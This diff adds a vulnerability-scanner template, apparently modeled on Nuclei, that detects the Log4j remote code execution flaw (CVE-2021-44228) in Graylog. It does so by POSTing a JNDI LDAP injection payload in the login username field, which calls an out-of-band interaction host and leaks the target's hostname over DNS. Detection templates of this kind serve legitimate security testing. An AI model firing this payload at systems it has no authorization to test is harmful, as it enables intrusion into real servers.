@@ -1,0 +1,40 @@
+id: graylog-log4j-rce
+brief:
+    title: Graylog (Log4j) - Remote Code Execution
+    by: DhiyaneshDK
+    level: critical
+    about: Graylog is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input. A...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - graylog
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/system/sessions'
+      head:
+        Accept: application/json
+        Content-Type: application/json
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}'
+        X-Requested-By: XMLHttpRequest
+        X-Requested-With: XMLHttpRequest
+      body: '{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}'
+      signs:
+        - "on": word
+          has:
+            - 'X-Graylog-Node-Id:'
+          in: header
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
